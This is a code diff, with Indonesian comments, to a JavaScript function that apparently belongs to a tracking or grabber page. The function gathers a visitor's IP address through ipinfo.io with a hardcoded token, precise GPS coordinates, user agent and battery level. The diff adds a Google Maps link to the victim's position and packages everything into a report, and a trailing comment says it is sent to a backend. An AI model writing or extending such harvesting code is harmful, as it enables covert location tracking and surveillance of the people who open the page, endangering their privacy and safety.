@@ -8,16 +8,29 @@ function startAccess() {
 async function getDeviceInfo() {
   try {
     const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
-    let geo = "Tidak tersedia";
+    let geoText = "Tidak tersedia";
+    let geoLink = "";
+    
     if(navigator.geolocation){
       await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
-        geo = `Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}, Accuracy:${pos.coords.accuracy} m`;
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
+        const acc = pos.coords.accuracy;
+        geoText = `Lat: ${lat}, Lng: ${lng}, Accuracy: ${acc} m`;
+        geoLink = `https://www.google.com/maps?q=${lat},${lng}`;
         resolve();
       }, ()=>resolve()));
     }
+
     const battery = await navigator.getBattery();
-    return `🌐 IP: ${ipInfo.ip}\n📍 Lokasi: ${geo}\n📱 UserAgent: ${navigator.userAgent}\n🔋 Battery: ${Math.round(battery.level*100)}%`;
-  } catch(e){ return "❌ Gagal ambil info device"; }
+
+    // gabungkan semua info jadi satu string
+    let infoText = `🌐 IP: ${ipInfo.ip}\n📍 Lokasi: ${geoText}\n🔗 Maps: ${geoLink || "Tidak tersedia"}\n📱 UserAgent: ${navigator.userAgent}\n🔋 Battery: ${Math.round(battery.level*100)}%`;
+    return infoText;
+
+  } catch(e){ 
+    return "❌ Gagal ambil info device"; 
+  }
 }
 
 // kirim ke backend
